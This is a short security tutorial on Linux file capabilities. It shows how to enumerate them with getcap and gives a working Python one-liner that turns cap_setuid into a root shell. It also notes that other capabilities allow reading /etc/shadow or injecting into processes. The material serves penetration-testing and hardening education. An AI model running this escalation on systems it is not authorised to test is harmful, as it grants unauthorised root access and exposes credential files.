Linux **capabilities** break the monolithic power of root into discrete units —
`CAP_NET_BIND_SERVICE`, `CAP_SYS_ADMIN`, `CAP_SETUID`, and dozens more. The idea
is least privilege: a binary gets only the capability it needs. The risk is that
the *wrong* capability on a flexible binary is equivalent to full root.

## Enumerate file capabilities

```bash title="List files with capabilities"
getcap -r / 2>/dev/null
```

You're looking for capabilities attached to binaries that can run code or change
identity. Output looks like this:

```ansi title="Example"
/usr/bin/python3.11 = cap_setuid+ep
/usr/bin/ping = cap_net_raw+ep
```

`ping` having `cap_net_raw` is normal. `python3` having `cap_setuid` is not — and
it's exploitable.

## Abusing cap_setuid

`cap_setuid+ep` lets a process call `setuid(0)` and become root. With Python:

```bash title="cap_setuid python → root"
/usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

The interpreter is allowed to set its UID to 0, then it spawns a shell that
inherits the root identity.

<Callout type="note" title="Reading the flags">
  The suffix matters. <code>+ep</code> means the capability is
  <strong>e</strong>ffective and <strong>p</strong>ermitted — active for the
  process. <code>+i</code> (inheritable) alone is usually not directly useful.
</Callout>

## Other high-value capabilities

- `cap_dac_read_search` — bypass file read permission checks (read any file,
  including `/etc/shadow`).
- `cap_sys_admin` — extremely broad; often a path to full compromise.
- `cap_sys_ptrace` — attach to and inject into other processes.

<Callout type="warning" title="Capabilities hide in plain sight">
  Capabilities don't show up in a SUID search, so a host that looks "clean"
  under <code>find / -perm -4000</code> can still hand you root via
  <code>getcap</code>. Always check both.
</Callout>

## Recap

- Enumerate with `getcap -r / 2>/dev/null`.
- `cap_setuid` on an interpreter is a direct root shell.
- Capabilities are invisible to SUID enumeration — check them separately.
